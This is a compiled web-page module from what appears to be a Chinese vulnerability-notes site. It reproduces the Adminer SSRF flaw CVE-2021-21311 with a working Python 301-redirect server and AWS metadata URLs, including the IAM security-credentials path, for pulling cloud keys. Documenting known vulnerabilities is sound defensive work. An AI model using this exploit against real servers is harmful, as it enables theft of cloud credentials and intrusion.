import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as p,o,c as i,a as n,b as s,d as e,e as c}from"./app-58e4a7d6.js";const l={},r=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),u=n("p",null,"使用管理员发送任意get请求并从内部服务器检索JSON响应的方法。可以从AWS元数据服务中提取AWS访问密钥。",-1),d=n("p",null,"参考链接：",-1),k={href:"https://github.com/advisories/GHSA-x5r2-hj5c-8jx6",target:"_blank",rel:"noopener noreferrer"},v={href:"https://gist.github.com/bpsizemore/227141941c5075d96a34e375c63ae3bd",target:"_blank",rel:"noopener noreferrer"},m=c(`<h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>首先，启动一个python服务器，该服务器侦听传入的连接并以301重定向响应到任意选择的主机。在此示例情况下，重定向指向AWS元数据服务：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://169.254.169.254/latest/meta-data/instance-id
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>然后，在Adminer中使用Elasticsearch登录模块“登录”运行python代码的服务器，这导致Adminer从包含服务器的AWS实例ID的元数据服务器打印json响应。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/16133787776790.jpg" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>重定向请求的python脚本：</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python</span>

<span class="token keyword">import</span> SimpleHTTPServer
<span class="token keyword">import</span> SocketServer
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> argparse

<span class="token keyword">def</span> <span class="token function">redirect_handler_factory</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;
    Returns a request handler class that redirects to supplied \`url\`
    &quot;&quot;&quot;</span>
    <span class="token keyword">class</span> <span class="token class-name">RedirectHandler</span><span class="token punctuation">(</span>SimpleHTTPServer<span class="token punctuation">.</span>SimpleHTTPRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
       <span class="token keyword">def</span> <span class="token function">do_GET</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
           self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">301</span><span class="token punctuation">)</span>
           self<span class="token punctuation">.</span>send_header<span class="token punctuation">(</span><span class="token string">&#39;Location&#39;</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span>
           self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>

       <span class="token keyword">def</span> <span class="token function">do_POST</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
           self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">301</span><span class="token punctuation">)</span>
           self<span class="token punctuation">.</span>send_header<span class="token punctuation">(</span><span class="token string">&#39;Location&#39;</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span>
           self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> RedirectHandler


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">&#39;HTTP redirect server&#39;</span><span class="token punctuation">)</span>

    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--port&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-p&#39;</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">&quot;store&quot;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;port to listen on&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--ip&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-i&#39;</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">&quot;store&quot;</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;host interface to listen on&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;redirect_url&#39;</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">&quot;store&quot;</span><span class="token punctuation">)</span>

    myargs <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>

    redirect_url <span class="token operator">=</span> myargs<span class="token punctuation">.</span>redirect_url
    port <span class="token operator">=</span> myargs<span class="token punctuation">.</span>port
    host <span class="token operator">=</span> myargs<span class="token punctuation">.</span>ip

    redirectHandler <span class="token operator">=</span> redirect_handler_factory<span class="token punctuation">(</span>redirect_url<span class="token punctuation">)</span>

    handler <span class="token operator">=</span> SocketServer<span class="token punctuation">.</span>TCPServer<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">,</span> redirectHandler<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;serving at port %s&quot;</span> <span class="token operator">%</span> port<span class="token punctuation">)</span>
    handler<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/  //列出服务器的可用角色。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/16133787994051.jpg" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,9);function b(g,h){const a=p("ExternalLinkIcon");return o(),i("div",null,[r,u,d,n("ul",null,[n("li",null,[n("a",k,[s("https://github.com/advisories/GHSA-x5r2-hj5c-8jx6"),e(a)])]),n("li",null,[n("a",v,[s("https://gist.github.com/bpsizemore/227141941c5075d96a34e375c63ae3bd"),e(a)])])]),m])}const y=t(l,[["render",b],["__file","Adminer-SSRF漏洞 CVE-2021-21311.html.vue"]]);export{y as default};
